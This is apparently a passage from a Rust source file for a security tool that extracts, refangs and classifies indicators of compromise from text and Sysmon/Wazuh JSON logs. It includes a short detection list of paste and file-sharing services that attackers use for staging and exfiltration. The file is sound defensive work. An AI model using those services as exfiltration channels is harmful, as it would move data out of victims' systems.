//! IOC extraction, normalisation and classification.
//!
//! Extracts indicators from free text and from JSON documents (field-aware:
//! a value under `queryName` is a host name, `hashes` holds Sysmon
//! `SHA256=..,MD5=..` pairs, `*version*` fields never yield IPs, Wazuh
//! infrastructure fields such as `agent.*` / `rule.groups` are skipped).
//!
//! Precision matters more than recall here — every reported indicator ends up
//! in threat-intel lookups and in the analyst report — so the extractor:
//! - validates IPv4 octets (no leading zeros) and rejects dotted version
//!   strings (`10.0.19041.1`, `Version=4.0.0.0`, `Chrome/120.0.0.0`, OIDs),
//! - only reports domains with a recognised TLD from free text and rejects
//!   file names (`svchost.exe`), .NET namespaces
//!   (`System.Management.Automation.dll`, `System.Net.WebClient`), field paths
//!   (`rule.id`, `agent.name`) and two-label names ending in a file extension
//!   that is also a TLD (`setup.py`, `update.zip`),
//! - refangs `hxxp`, `[.]`, `(dot)`, `[@]`, `[:]` and records that the
//!   indicator was defanged,
//! - labels Sysmon hash pairs by algorithm (so `IMPHASH=` is not an MD5),
//! - dedupes with occurrence counts and the source field paths.

use std::borrow::Cow;
use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::fmt;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::str::FromStr;
use std::sync::LazyLock;

use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::common::re;
use crate::tld;

/// Kind of indicator.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IocType {
    /// IPv4 address.
    Ipv4,
    /// IPv6 address (IPv4-mapped addresses are reported as IPv4).
    Ipv6,
    /// Domain / host name.
    Domain,
    /// URL.
    Url,
    /// E-mail address.
    Email,
    /// MD5 file hash.
    Md5,
    /// SHA-1 file hash.
    Sha1,
    /// SHA-256 file hash.
    Sha256,
    /// SHA-512 file hash.
    Sha512,
    /// PE import hash (Sysmon `IMPHASH=`).
    Imphash,
    /// CVE identifier.
    Cve,
    /// MITRE ATT&CK technique id.
    MitreTechnique,
    /// Windows file path (drive, UNC, `%VAR%`, device paths).
    WindowsPath,
    /// Unix file path.
    UnixPath,
    /// Windows registry key.
    RegistryKey,
    /// HTTP user agent.
    UserAgent,
}

impl IocType {
    /// Every type, in report order.
    pub const ALL: [IocType; 16] = [
        IocType::Ipv4,
        IocType::Ipv6,
        IocType::Domain,
        IocType::Url,
        IocType::Email,
        IocType::Md5,
        IocType::Sha1,
        IocType::Sha256,
        IocType::Sha512,
        IocType::Imphash,
        IocType::Cve,
        IocType::MitreTechnique,
        IocType::WindowsPath,
        IocType::UnixPath,
        IocType::RegistryKey,
        IocType::UserAgent,
    ];

    /// Wire name (`"sha256"`, `"windows_path"`, ...); matches the
    /// `ioc_sightings.ioc_type` column of `talon-db`.
    pub fn as_str(self) -> &'static str {
        match self {
            IocType::Ipv4 => "ipv4",
            IocType::Ipv6 => "ipv6",
            IocType::Domain => "domain",
            IocType::Url => "url",
            IocType::Email => "email",
            IocType::Md5 => "md5",
            IocType::Sha1 => "sha1",
            IocType::Sha256 => "sha256",
            IocType::Sha512 => "sha512",
            IocType::Imphash => "imphash",
            IocType::Cve => "cve",
            IocType::MitreTechnique => "mitre_technique",
            IocType::WindowsPath => "windows_path",
            IocType::UnixPath => "unix_path",
            IocType::RegistryKey => "registry_key",
            IocType::UserAgent => "user_agent",
        }
    }

    /// Parse a wire name (case-insensitive; `ip` is not accepted because it
    /// is ambiguous — use `ipv4`/`ipv6`).
    pub fn parse(s: &str) -> Option<Self> {
        let s = s.trim().to_ascii_lowercase();
        IocType::ALL.iter().copied().find(|t| t.as_str() == s)
    }

    /// File-hash types.
    pub fn is_hash(self) -> bool {
        matches!(
            self,
            IocType::Md5 | IocType::Sha1 | IocType::Sha256 | IocType::Sha512 | IocType::Imphash
        )
    }

    /// Network indicators (IPs, domains, URLs, e-mails).
    pub fn is_network(self) -> bool {
        matches!(
            self,
            IocType::Ipv4 | IocType::Ipv6 | IocType::Domain | IocType::Url | IocType::Email
        )
    }

    /// CoPilot `SubmitAiAnalystIocsTool` type (`ip|domain|hash|process|url|user|command`).
    pub fn copilot_type(self) -> Option<&'static str> {
        match self {
            IocType::Ipv4 | IocType::Ipv6 => Some("ip"),
            IocType::Domain => Some("domain"),
            IocType::Url => Some("url"),
            IocType::Md5 | IocType::Sha1 | IocType::Sha256 | IocType::Sha512 | IocType::Imphash => {
                Some("hash")
            }
            IocType::WindowsPath | IocType::UnixPath => Some("process"),
            _ => None,
        }
    }

    /// Values compare case-insensitively for deduplication.
    fn case_insensitive(self) -> bool {
        !matches!(self, IocType::Url | IocType::UnixPath | IocType::UserAgent)
    }
}

impl fmt::Display for IocType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Address / name-space classification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Scope {
    /// Globally routable address.
    Public,
    /// RFC 1918 / IPv6 unique-local (and deprecated site-local).
    Private,
    /// Loopback.
    Loopback,
    /// Link-local (169.254/16, fe80::/10).
    LinkLocal,
    /// Multicast.
    Multicast,
    /// Carrier-grade NAT shared space (100.64/10).
    SharedAddressSpace,
    /// Documentation ranges (TEST-NET, 2001:db8::/32, 3fff::/20).
    Documentation,
    /// Reserved / special-purpose / benchmarking.
    Reserved,
    /// `0.0.0.0` / `::`.
    Unspecified,
    /// `255.255.255.255`.
    Broadcast,
    /// Internal name space (`.local`, `.corp`, unknown TLD, single host).
    Internal,
    /// Public DNS name.
    External,
}

impl Scope {
    /// Wire name.
    pub fn as_str(self) -> &'static str {
        match self {
            Scope::Public => "public",
            Scope::Private => "private",
            Scope::Loopback => "loopback",
            Scope::LinkLocal => "link_local",
            Scope::Multicast => "multicast",
            Scope::SharedAddressSpace => "shared_address_space",
            Scope::Documentation => "documentation",
            Scope::Reserved => "reserved",
            Scope::Unspecified => "unspecified",
            Scope::Broadcast => "broadcast",
            Scope::Internal => "internal",
            Scope::External => "external",
        }
    }

    /// Reachable on / meaningful for the public Internet.
    pub fn is_external(self) -> bool {
        matches!(self, Scope::Public | Scope::External)
    }
}

/// One deduplicated indicator.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Ioc {
    /// Indicator kind.
    #[serde(rename = "type")]
    pub ioc_type: IocType,
    /// Normalised value (refanged; lowercase for case-insensitive kinds,
    /// except paths/registry keys which keep their first-seen spelling).
    pub value: String,
    /// Number of occurrences.
    pub count: u32,
    /// Field paths the indicator was found in (`"text"` for free text).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub sources: Vec<String>,
    /// Network classification (IPs, domains, URLs, e-mails).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub scope: Option<Scope>,
    /// At least one occurrence was defanged in the input.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub defanged: bool,
    /// Extra context (technique name, `from reverse DNS query`, ...).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub note: Option<String>,
}

impl Ioc {
    /// Public IP / external domain / URL or e-mail with an external host.
    pub fn is_external(&self) -> bool {
        self.scope.is_some_and(Scope::is_external)
    }

    /// Worth a threat-intel lookup: external network indicators, file hashes
    /// and CVEs.
    pub fn is_enrichable(&self) -> bool {
        (self.ioc_type.is_network() && self.is_external())
            || self.ioc_type.is_hash()
            || self.ioc_type == IocType::Cve
    }

    /// Stable correlation key `"<type>:<lowercase value>"`.
    pub fn key(&self) -> String {
        format!(
            "{}:{}",
            self.ioc_type.as_str(),
            if self.ioc_type.case_insensitive() {
                self.value.to_lowercase()
            } else {
                self.value.clone()
            }
        )
    }

    /// Defanged rendering for reports (`hxxp://evil[.]com`).
    pub fn defanged_value(&self) -> String {
        defang(&self.value, self.ioc_type)
    }
}

/// Result of an extraction.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct IocReport {
    /// Indicators, grouped by type (report order) then first appearance.
    pub iocs: Vec<Ioc>,
    /// `true` when `max_iocs` was hit and further indicators were dropped.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub truncated: bool,
}

impl IocReport {
    /// Number of distinct indicators.
    pub fn len(&self) -> usize {
        self.iocs.len()
    }

    /// No indicators.
    pub fn is_empty(&self) -> bool {
        self.iocs.is_empty()
    }

    /// Distinct indicators per type.
    pub fn counts(&self) -> BTreeMap<IocType, usize> {
        let mut m = BTreeMap::new();
        for i in &self.iocs {
            *m.entry(i.ioc_type).or_insert(0) += 1;
        }
        m
    }

    /// Indicators of one type.
    pub fn of_type(&self, t: IocType) -> impl Iterator<Item = &Ioc> + '_ {
        self.iocs.iter().filter(move |i| i.ioc_type == t)
    }

    /// Indicators worth a threat-intel lookup (see [`Ioc::is_enrichable`]).
    pub fn enrichable(&self) -> impl Iterator<Item = &Ioc> + '_ {
        self.iocs.iter().filter(|i| i.is_enrichable())
    }

    /// Find an indicator by type and value (case-insensitive where applicable).
    pub fn find(&self, t: IocType, value: &str) -> Option<&Ioc> {
        self.iocs.iter().find(|i| {
            i.ioc_type == t
                && if t.case_insensitive() {
                    i.value.eq_ignore_ascii_case(value)
                } else {
                    i.value == value
                }
        })
    }
}

/// Extraction options.
#[derive(Debug, Clone)]
pub struct ExtractOptions {
    /// Only report these types (`None` = all).
    pub types: Option<BTreeSet<IocType>>,
    /// Maximum distinct indicators reported. When exceeded, `truncated` is
    /// set and the report keeps a type-balanced selection (round-robin over
    /// types, first-seen order within a type).
    pub max_iocs: usize,
    /// Maximum distinct source paths kept per indicator.
    pub max_sources_per_ioc: usize,
    /// Skip Wazuh/OpenSearch infrastructure fields (`agent.*`, `manager.*`,
    /// `rule.groups`, `location`, `data.win.system.*` except `message`, ...).
    pub skip_infrastructure_fields: bool,
    /// Maximum JSON nesting depth walked.
    pub max_depth: usize,
}

impl Default for ExtractOptions {
    fn default() -> Self {
        Self {
            types: None,
            max_iocs: 1000,
            max_sources_per_ioc: 8,
            skip_infrastructure_fields: true,
            max_depth: 64,
        }
    }
}

/// Extract indicators from free text with default options.
pub fn extract_from_text(text: &str) -> IocReport {
    let mut x = IocExtractor::new(ExtractOptions::default());
    x.add_text(text, None);
    x.finish()
}

/// Extract indicators from a JSON document with default options.
pub fn extract_from_json(value: &Value) -> IocReport {
    let mut x = IocExtractor::new(ExtractOptions::default());
    x.add_json(value);
    x.finish()
}

/// Incremental extractor: feed text and JSON, then [`finish`](Self::finish).
#[derive(Debug)]
pub struct IocExtractor {
    opts: ExtractOptions,
    index: HashMap<(IocType, String), usize>,
    per_type: HashMap<IocType, usize>,
    iocs: Vec<Ioc>,
    truncated: bool,
}

impl IocExtractor {
    /// New extractor.
    pub fn new(opts: ExtractOptions) -> Self {
        Self {
            opts,
            index: HashMap::new(),
            per_type: HashMap::new(),
            iocs: Vec::new(),
            truncated: false,
        }
    }

    /// Scan free text; `source` is recorded as the origin (default `"text"`).
    pub fn add_text(&mut self, text: &str, source: Option<&str>) {
        self.scan(text, source.unwrap_or("text"), Hint::Generic);
    }

    /// Walk a JSON document, scanning every string value field-aware.
    pub fn add_json(&mut self, value: &Value) {
        let mut path = Vec::new();
        self.walk(value, &mut path, 0);
    }

    /// Finish and return the deduplicated report.
    pub fn finish(self) -> IocReport {
        let mut iocs = self.iocs;
        let mut truncated = self.truncated;
        let max = self.opts.max_iocs;
        if iocs.len() > max {
            truncated = true;
            let mut by_type: BTreeMap<IocType, std::collections::VecDeque<Ioc>> = BTreeMap::new();
            for i in iocs {
                by_type.entry(i.ioc_type).or_default().push_back(i);
            }
            let mut kept = Vec::with_capacity(max);
            'fill: loop {
                let mut progressed = false;
                for q in by_type.values_mut() {
                    if kept.len() >= max {
                        break 'fill;
                    }
                    if let Some(i) = q.pop_front() {
                        kept.push(i);
                        progressed = true;
                    }
                }
                if !progressed {
                    break;
                }
            }
            iocs = kept;
        }
        // Stable: keeps first-appearance order within a type.
        iocs.sort_by_key(|i| i.ioc_type);
        IocReport { iocs, truncated }
    }

    fn walk(&mut self, v: &Value, path: &mut Vec<String>, depth: usize) {
        if depth > self.opts.max_depth {
            return;
        }
        match v {
            Value::Object(map) => {
                for (k, child) in map {
                    path.push(k.clone());
                    self.walk(child, path, depth + 1);
                    path.pop();
                }
            }
            Value::Array(items) => {
                for child in items {
                    self.walk(child, path, depth + 1);
                }
            }
            Value::String(s) => {
                let rel = relative_path(path);
                let hint = field_hint(&rel, self.opts.skip_infrastructure_fields);
                if hint != Hint::Skip {
                    let src = if rel.is_empty() {
                        "text".to_string()
                    } else {
                        rel.join(".")
                    };
                    self.scan(s, &src, hint);
                }
            }
            _ => {}
        }
    }

    fn scan(&mut self, raw: &str, source: &str, hint: Hint) {
        let refanged = refang(raw);
        let any_defanged = matches!(refanged, Cow::Owned(_));
        let raw_lower = if any_defanged {
            raw.to_lowercase()
        } else {
            String::new()
        };
        // Defender writes `file:_C:\..` / `containerfile:_C:\..`; the `_`
        // would hide the drive letter from the path scanner.
        let normalised = if refanged.contains("file:_") {
            Cow::Owned(refanged.replace("file:_", "file: "))
        } else {
            refanged
        };
        let found = scan_value(&normalised, hint);
        for f in found {
            let defanged = any_defanged && !raw_lower.contains(&f.value.to_lowercase());
            self.push(f, source, defanged);
        }
    }

    fn push(&mut self, f: Found, source: &str, defanged: bool) {
        if let Some(types) = &self.opts.types {
            if !types.contains(&f.ty) {
                return;
            }
        }
        let key_value = if f.ty.case_insensitive() {
            f.value.to_lowercase()
        } else {
            f.value.clone()
        };
        let key = (f.ty, key_value);
        if let Some(&idx) = self.index.get(&key) {
            let ioc = &mut self.iocs[idx];
            ioc.count = ioc.count.saturating_add(1);
            ioc.defanged |= defanged;
            if ioc.note.is_none() {
                ioc.note = f.note;
            }
            if !ioc.sources.iter().any(|s| s == source)
                && ioc.sources.len() < self.opts.max_sources_per_ioc
            {
                ioc.sources.push(source.to_string());
            }
            return;
        }
        // Bounded per type, so one noisy type cannot crowd out the others;
        // `finish` selects a type-balanced subset.
        let per_type = self.per_type.entry(f.ty).or_insert(0);
        if *per_type >= self.opts.max_iocs {
            self.truncated = true;
            return;
        }
        *per_type += 1;
        self.index.insert(key, self.iocs.len());
        self.iocs.push(Ioc {
            ioc_type: f.ty,
            value: f.value,
            count: 1,
            sources: vec![source.to_string()],
            scope: f.scope,
            defanged,
            note: f.note,
        });
    }
}

// ---------------------------------------------------------------------------
// Field awareness
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Hint {
    Generic,
    Hashes,
    HashOf(IocType),
    Domain,
    NoNetwork,
    NoHash,
    Path,
    Registry,
    UserAgent,
    Skip,
}

/// Path below the last `_source` segment (OpenSearch hit wrappers).
fn relative_path(path: &[String]) -> Vec<String> {
    match path.iter().rposition(|p| p == "_source") {
        Some(i) => path[i + 1..].to_vec(),
        None => path.to_vec(),
    }
}

const INFRA_PREFIXES: &[&str] = &[
    "agent",
    "manager",
    "cluster",
    "decoder",
    "predecoder",
    "rule.groups",
    "rule.id",
    "rule.level",
    "rule.firedtimes",
    "rule.mail",
    "rule.pci.dss",
    "rule.gdpr",
    "rule.hipaa",
    "rule.nist.800.53",
    "rule.tsc",
    "rule.gpg13",
    "rule.frequency",
    "rule.mitre.tactic",
    "rule.mitre.technique",
    "@timestamp",
    "timestamp",
    "@version",
    "id",
    "index.id",
    "index.name",
    "location",
    "input",
    "gl2",
    "streams",
    "data.win.system",
];

fn field_hint(rel: &[String], skip_infra: bool) -> Hint {
    if rel.is_empty() {
        return Hint::Generic;
    }
    let canon = rel.join(".").to_ascii_lowercase().replace('_', ".");
    if rel.first().is_some_and(|f| f.starts_with('_')) {
        // `_index`, `_id`, `_type`, `_score`, ...
        return Hint::Skip;
    }
    if skip_infra
        && !canon.ends_with("message")
        && INFRA_PREFIXES
            .iter()
            .any(|p| canon == *p || canon.starts_with(&format!("{p}.")))
    {
        return Hint::Skip;
    }
    let key = rel
        .last()
        .map(|k| k.to_ascii_lowercase())
        .unwrap_or_default();
    // Vendor documentation links (Defender `fWLink`) are not indicators.
    if key.ends_with("fwlink") {
        return Hint::Skip;
    }
    if key.contains("useragent") || key.contains("user_agent") || canon.ends_with("user.agent") {
        return Hint::UserAgent;
    }
    if key == "hashes" || key == "hash" || key.ends_with("_hashes") {
        return Hint::Hashes;
    }
    for (needle, t) in [
        ("sha512", IocType::Sha512),
        ("sha256", IocType::Sha256),
        ("sha1", IocType::Sha1),
        ("md5", IocType::Md5),
        ("imphash", IocType::Imphash),
    ] {
        if key.contains(needle) {
            return Hint::HashOf(t);
        }
    }
    if [
        "queryname",
        "destinationhostname",
        "sourcehostname",
        "question.name",
        "dns.query",
        "dns.rrname",
        "http.hostname",
        "tls.sni",
        "server.name",
    ]
    .iter()
    .any(|s| canon.ends_with(s))
    {
        return Hint::Domain;
    }
    if key.ends_with("targetobject") {
        return Hint::Registry;
    }
    if [
        "image",
        "parentimage",
        "imageloaded",
        "targetfilename",
        "sourceimage",
        "targetimage",
        "imagepath",
        "processname",
        "newprocessname",
        "parentprocessname",
        "currentdirectory",
        "filepath",
        "file_path",
    ]
    .iter()
    .any(|s| key.ends_with(s))
        || key == "path"
        || key.ends_with("_path")
        || canon.ends_with(".path")
    {
        return Hint::Path;
    }
    if key.contains("version") {
        return Hint::NoNetwork;
    }
    if [
        "guid",
        "uuid",
        "logonid",
        "sessionid",
        "activityid",
        "correlationid",
        "requestid",
        "traceid",
        "spanid",
        "nonce",
        "token",
    ]
    .iter()
    .any(|s| key.contains(s))
    {
        return Hint::NoHash;
    }
    Hint::Generic
}

// ---------------------------------------------------------------------------
// Refang / defang
// ---------------------------------------------------------------------------

// Static patterns (see `common::re`).
static RE_HXXP: LazyLock<Regex> = LazyLock::new(|| re(r"(?i)\bh(?:xx|tx|xt|\*\*|__)p(s?)\b"));
static RE_FXP: LazyLock<Regex> = LazyLock::new(|| re(r"(?i)\bfxp://"));
static RE_BRACKET: LazyLock<Regex> =
    LazyLock::new(|| re(r"(?i)[ \t]?[\[\(\{][ \t]*(\.|dot|@|at|:|/|://)[ \t]*[\]\)\}][ \t]?"));

/// Undo common defanging: `hxxp(s)`, `fxp`, `[.]`, `(.)`, `{.}`, `[dot]`,
/// `(dot)`, `[@]`, `(at)`, `[:]`, `[/]`, `[://]`.
pub fn refang(input: &str) -> Cow<'_, str> {
    let lower_has = |needles: &[&str]| {
        let l = input.to_ascii_lowercase();
        needles.iter().any(|n| l.contains(n))
    };
    if !lower_has(&["xxp", "txp", "xtp", "**p", "__p", "fxp", "[", "(", "{"]) {
        return Cow::Borrowed(input);
    }
    let a = RE_HXXP.replace_all(input, "http$1");
    let b = RE_FXP.replace_all(&a, "ftp://");
    let c = RE_BRACKET.replace_all(&b, |caps: &regex::Captures<'_>| {
        match caps
            .get(1)
            .map(|m| m.as_str().to_ascii_lowercase())
            .as_deref()
        {
            Some(".") | Some("dot") => ".".to_string(),
            Some("@") | Some("at") => "@".to_string(),
            Some(":") => ":".to_string(),
            Some("/") => "/".to_string(),
            Some("://") => "://".to_string(),
            _ => caps
                .get(0)
                .map(|m| m.as_str().to_string())
                .unwrap_or_default(),
        }
    });
    if c == input {
        Cow::Borrowed(input)
    } else {
        Cow::Owned(c.into_owned())
    }
}

/// Defang an indicator for safe display (`hxxps://evil[.]com/x`,
/// `1.2.3[.]4`, `user[@]evil[.]com`). Non-network types are returned as-is.
pub fn defang(value: &str, t: IocType) -> String {
    match t {
        IocType::Url => {
            let (scheme, rest) = match value.split_once("://") {
                Some((s, r)) => (s, r),
                None => return value.replace('.', "[.]"),
            };
            let scheme = match scheme.to_ascii_lowercase().as_str() {
                "http" => "hxxp".to_string(),
                "https" => "hxxps".to_string(),
                "ftp" => "fxp".to_string(),
                other => other.to_string(),
            };
            let (host, tail) = match rest.find('/') {
                Some(i) => rest.split_at(i),
                None => (rest, ""),
            };
            format!("{scheme}://{}{tail}", host.replace('.', "[.]"))
        }
        IocType::Domain | IocType::Ipv4 => value.replace('.', "[.]"),
        IocType::Email => value.replace('@', "[@]").replace('.', "[.]"),
        IocType::Ipv6 => value.replace(':', "[:]"),
        _ => value.to_string(),
    }
}

// ---------------------------------------------------------------------------
// IP classification
// ---------------------------------------------------------------------------

/// Classify an IPv4 address.
pub fn classify_ipv4(ip: Ipv4Addr) -> Scope {
    let o = ip.octets();
    if ip.is_unspecified() {
        Scope::Unspecified
    } else if ip.is_broadcast() {
        Scope::Broadcast
    } else if o[0] == 0 {
        Scope::Reserved
    } else if o[0] == 127 {
        Scope::Loopback
    } else if o[0] == 10
        || (o[0] == 172 && (16..=31).contains(&o[1]))
        || (o[0] == 192 && o[1] == 168)
    {
        Scope::Private
    } else if o[0] == 100 && (64..=127).contains(&o[1]) {
        Scope::SharedAddressSpace
    } else if o[0] == 169 && o[1] == 254 {
        Scope::LinkLocal
    } else if (o[0] == 192 && o[1] == 0 && o[2] == 2)
        || (o[0] == 198 && o[1] == 51 && o[2] == 100)
        || (o[0] == 203 && o[1] == 0 && o[2] == 113)
    {
        Scope::Documentation
    } else if (o[0] == 192 && o[1] == 0 && o[2] == 0) || (o[0] == 198 && (o[1] == 18 || o[1] == 19))
    {
        Scope::Reserved
    } else if (224..=239).contains(&o[0]) {
        Scope::Multicast
    } else if o[0] >= 240 {
        Scope::Reserved
    } else {
        Scope::Public
    }
}

/// Classify an IPv6 address (IPv4-mapped and NAT64 addresses are classified
/// by their embedded IPv4 address).
pub fn classify_ipv6(ip: Ipv6Addr) -> Scope {
    if let Some(v4) = ip.to_ipv4_mapped() {
        return classify_ipv4(v4);
    }
    let s = ip.segments();
    if ip.is_unspecified() {
        Scope::Unspecified
    } else if ip.is_loopback() {
        Scope::Loopback
    } else if s[0] & 0xffc0 == 0xfe80 {
        Scope::LinkLocal
    } else if s[0] & 0xfe00 == 0xfc00 || s[0] & 0xffc0 == 0xfec0 {
        Scope::Private
    } else if s[0] & 0xff00 == 0xff00 {
        Scope::Multicast
    } else if (s[0] == 0x2001 && s[1] == 0x0db8) || (s[0] == 0x3fff && s[1] & 0xf000 == 0) {
        Scope::Documentation
    } else if s[0] == 0x0064 && s[1] == 0xff9b && s[2..6] == [0, 0, 0, 0] {
        let o = ip.octets();
        classify_ipv4(Ipv4Addr::new(o[12], o[13], o[14], o[15]))
    } else if s[0] & 0xe000 == 0x2000 {
        Scope::Public
    } else {
        Scope::Reserved
    }
}

/// Classify any IP address.
pub fn classify_ip(ip: IpAddr) -> Scope {
    match ip {
        IpAddr::V4(v4) => classify_ipv4(v4),
        IpAddr::V6(v6) => classify_ipv6(v6),
    }
}

// ---------------------------------------------------------------------------
// Domain validation
// ---------------------------------------------------------------------------

/// First labels that mark a dotted *field path* rather than a host
/// (`rule.id`, `agent.name`, `data.win`...).
const FIELD_PREFIXES: &[&str] = &[
    "rule",
    "agent",
    "data",
    "manager",
    "decoder",
    "predecoder",
    "syscheck",
    "win",
    "eventdata",
    "mitre",
    "vulnerability",
    "cluster",
    "winlog",
    "event",
];

/// Real TLDs that are also common identifier suffixes in code / field names.
const CODEISH_TLDS: &[&str] = &[
    "run", "name", "id", "info", "date", "link", "host", "email", "zone", "group", "page", "site",
    "one", "top", "live", "events", "network", "services", "tools", "software", "download",
    "codes", "direct", "center", "company", "systems", "support", "media", "news", "app", "dev",
    "win",
];

/// File-sharing / paste services frequently used for staging and
/// exfiltration whose TLD is also a file extension.
const KNOWN_SERVICE_DOMAINS: &[&str] = &["transfer.sh", "temp.sh", "paste.sh", "0x0.st"];

/// Identifier-like first labels used together with [`CODEISH_TLDS`].
const WORDISH_FIRST: &[&str] = &[
    "file",
    "process",
    "host",
    "user",
    "source",
    "destination",
    "target",
    "parent",
    "image",
    "log",
    "system",
    "config",
    "node",
    "field",
    "item",
    "object",
    "key",
    "value",
    "self",
    "this",
    "obj",
    "args",
    "kwargs",
    "param",
    "params",
    "request",
    "response",
    "req",
    "res",
    "client",
    "server",
    "app",
    "err",
    "error",
    "result",
    "input",
    "output",
    "os",
    "sys",
    "path",
    "dir",
    "folder",
    "script",
    "cmd",
    "command",
    "task",
    "job",
    "service",
    "session",
    "account",
    "group",
    "policy",
    "entry",
    "record",
    "doc",
    "document",
    "msg",
    "message",
    "subprocess",
    "ctx",
    "env",
    "settings",
    "network",
    "net",
    "proc",
    "thread",
    "window",
    "event",
    "alert",
    "asset",
    "customer",
    "case",
];

/// .NET / PowerShell namespace roots (case-sensitive first label).
const DOTNET_ROOTS: &[&str] = &[
    "System",
    "Microsoft",
    "Windows",
    "IO",
    "Net",
    "Management",
    "Security",
    "Newtonsoft",
    "Reflection",
    "Runtime",
    "Text",
    "Diagnostics",
];

fn is_valid_label(l: &str, allow_underscore: bool) -> bool {
    !l.is_empty()
        && l.len() <= 63
        && !l.starts_with('-')
        && !l.ends_with('-')
        && l.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || (allow_underscore && c == '_'))
}

/// Syntactic host-name check (≥ 2 labels, alphabetic or punycode TLD, not
/// an IP). Does **not** require a known TLD.
pub fn is_valid_hostname(host: &str) -> bool {
    let host = host.trim_end_matches('.');
    if host.len() > 253 || host.parse::<IpAddr>().is_ok() {
        return false;
    }
    let labels: Vec<&str> = host.split('.').collect();
    if labels.len() < 2 {
        return false;
    }
    let Some(tld) = labels.last() else {
        return false;
    };
    let tld_ok = (tld.len() >= 2 && tld.chars().all(|c| c.is_ascii_alphabetic()))
        || (tld.starts_with("xn--") && is_valid_label(tld, false));
    tld_ok
        && labels[..labels.len() - 1]
            .iter()
            .all(|l| is_valid_label(l, true))
}

/// `true` when `domain` is a syntactically valid host with a recognised
/// public TLD (the check applied to free-text candidates, minus context
/// heuristics).
pub fn is_public_domain(domain: &str) -> bool {
    let d = domain.trim_end_matches('.').to_ascii_lowercase();
    is_valid_hostname(&d)
        && d.rsplit('.').next().is_some_and(tld::is_known_tld)
        && !tld::is_internal_name(&d)
}

fn domain_scope(d: &str) -> Scope {
    if tld::is_internal_name(d) {
        return Scope::Internal;
    }
    match d.rsplit('.').next() {
        Some(t) if tld::is_known_tld(t) => Scope::External,
        _ => Scope::Internal,
    }
}

/// Context-aware acceptance of a free-text domain candidate.
fn accept_text_domain(original: &str, text: &str, start: usize, end: usize) -> bool {
    let lower = original.to_ascii_lowercase();
    let labels: Vec<&str> = lower.split('.').collect();
    let orig_labels: Vec<&str> = original.split('.').collect();
    let (Some(tld), Some(orig_tld)) = (labels.last(), orig_labels.last()) else {
        return false;
    };
    if !tld::is_known_tld(tld) {
        return false;
    }
    let before = text[..start].chars().next_back();
    let before2 = text[..start].chars().rev().nth(1);
    let after = text[end..].chars().next();
    // Path components, URL paths, e-mail domains, variables.
    if matches!(before, Some('\\' | '/' | '@' | '$' | '%')) {
        return false;
    }
    if before == Some('.') && before2.is_some_and(|c| c.is_ascii_alphanumeric()) {
        return false;
    }
    // Method calls / indexers / path continuation.
    if matches!(after, Some('(' | '\\' | '[')) {
        return false;
    }
    // Mixed-case code (`System.Net.WebClient`, `$obj.Name`): domains in
    // telemetry are lowercase (or all caps).
    let is_mixed = original != lower && original != original.to_ascii_uppercase();
    if is_mixed && *orig_tld != *tld {
        return false;
    }
    if orig_labels
        .first()
        .is_some_and(|f| DOTNET_ROOTS.contains(f))
    {
        return false;
    }
    if labels.len() == 2 {
        let first = labels[0];
        if KNOWN_SERVICE_DOMAINS.contains(&lower.as_str()) {
            return true;
        }
        if FIELD_PREFIXES.contains(&first) && CODEISH_TLDS.contains(tld) {
            return false;
        }
        if tld::is_file_extension_tld(tld) {
            return false;
        }
        if CODEISH_TLDS.contains(tld) && WORDISH_FIRST.contains(&first) {
            return false;
        }
        if CODEISH_TLDS.contains(tld) && matches!(after, Some('=' | ':' | ')')) {
            return false;
        }
    }
    true
}

/// `4.3.2.1.in-addr.arpa` → `1.2.3.4`.
fn reverse_dns_ipv4(d: &str) -> Option<Ipv4Addr> {
    let rest = d.strip_suffix(".in-addr.arpa")?;
    let parts: Vec<&str> = rest.split('.').collect();
    if parts.len() != 4 {
        return None;
    }
    let mut o = [0u8; 4];
    for (i, p) in parts.iter().rev().enumerate() {
        o[i] = parse_octet(p)?;
    }
    Some(Ipv4Addr::from(o))
}

fn parse_octet(p: &str) -> Option<u8> {
    if p.is_empty() || p.len() > 3 || (p.len() > 1 && p.starts_with('0')) {
        return None;
    }
    if !p.chars().all(|c| c.is_ascii_digit()) {
        return None;
    }
    p.parse::<u8>().ok()
}

// ---------------------------------------------------------------------------
// Scanning
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
struct Found {
    ty: IocType,
    value: String,
    scope: Option<Scope>,
    note: Option<String>,
}

impl Found {
    fn new(ty: IocType, value: impl Into<String>) -> Self {
        Self {
            ty,
            value: value.into(),
            scope: None,
            note: None,
        }
    }
    fn scoped(mut self, s: Scope) -> Self {
        self.scope = Some(s);
        self
    }
    fn noted(mut self, n: impl Into<String>) -> Self {
        self.note = Some(n.into());
        self
    }
}

#[derive(Default)]
struct Spans(Vec<(usize, usize)>);

impl Spans {
    fn overlaps(&self, s: usize, e: usize) -> bool {
        self.0.iter().any(|&(a, b)| s < b && a < e)
    }
    fn add(&mut self, s: usize, e: usize) {
        self.0.push((s, e));
    }
}

static RE_LABELED_HASH: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"(?i)\b(md5|sha1|sha-1|sha256|sha-256|sha512|sha-512|imphash)\s*[=:]\s*([0-9a-f]{16,128})\b",
    )
});
static RE_URL: LazyLock<Regex> =
    LazyLock::new(|| re(r#"(?i)\b(?:https?|ftps?|sftp|wss?)://[^\s"'<>`{}|\\^\[\]]+"#));
